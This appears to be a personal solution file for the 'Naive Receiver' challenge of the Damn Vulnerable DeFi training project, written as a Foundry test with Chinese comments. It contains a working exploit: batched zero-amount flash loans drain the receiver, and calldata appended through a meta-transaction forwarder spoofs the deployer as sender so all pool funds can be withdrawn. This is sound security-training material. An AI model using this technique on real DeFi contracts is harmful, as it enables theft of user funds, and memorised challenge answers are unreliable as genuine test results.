// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {EIP712} from "solady/utils/EIP712.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player); //该交易发起者和原始交易发起者都是player
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer); //初始分配1000ETH

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    //我自己的测试方法，验证BasicForwarder的签名和执行功能
    function testForwarderFails() public {
        BasicForwarder.Request memory request;
        request.from = player;
        request.target = address(pool);
        request.value = 0;
        request.gas = 500000;
        request.nonce = 0;
        request.deadline = block.timestamp + 1 hours;
        request.data = abi.encodeWithSelector(
            IERC3156FlashBorrower.onFlashLoan.selector, address(player), address(weth), 0, 1 ether, bytes("")
        );

        // 直接使用 Forwarder 的 domainSeparator 和 getDataHash
        bytes32 dataHash = forwarder.getDataHash(request);

        // 手动构造 EIP-712 哈希，使用 Forwarder 的域分隔符
        bytes32 typedDataHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(), // 使用 Forwarder 的域分隔符
                dataHash
            )
        );
        // 重新声明变量（避免重复声明错误）
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(playerPk, typedDataHash);
        bytes memory signature2 = abi.encodePacked(r2, s2, v2);

        forwarder.execute(request, signature2);
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    //困难1：player中并没有weth来支付gas====>我们需要在支付gaas前取得所有资金 or
    function test_naiveReceiver() public checkSolvedByPlayer {
        // 第一步：耗尽 Receiver
        //我的写法
        // for (uint256 i = 0; i < 10; i++) {
        //     pool.flashLoan(IERC3156FlashBorrower(address(receiver)), address(weth), 0, "");
        // }
        bytes[] memory callDatas = new bytes[](11);
        for (uint256 i = 0; i < 10; i++) {
            callDatas[i] = abi.encodeCall(
                NaiveReceiverPool.flashLoan, (IERC3156FlashBorrower(address(receiver)), address(weth), 0, "0x")
            );
        }

        // 第二步：提取池中资金到恢复账户 通过forwarder的excute
        callDatas[10] = abi.encodePacked(
            //withraw只会读取前面两个参数
            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(address(deployer)))) // 地址填充为32字节，因为_msgSender只会读取最后20字节
        );

        bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: gasleft(),
            nonce: forwarder.nonces(player),
            data: multicallData,
            deadline: block.timestamp + 1 hours
        });

        bytes32 requestHash =
            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        //玩家执行的交易次数必须不超过两次。
        assertLe(vm.getNonce(player), 2);

        // 闪贷接收方合约中的资金已被全部提取。
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // 池中的资金也已被全部提取。
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // 所有资金已发送到恢复账户
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
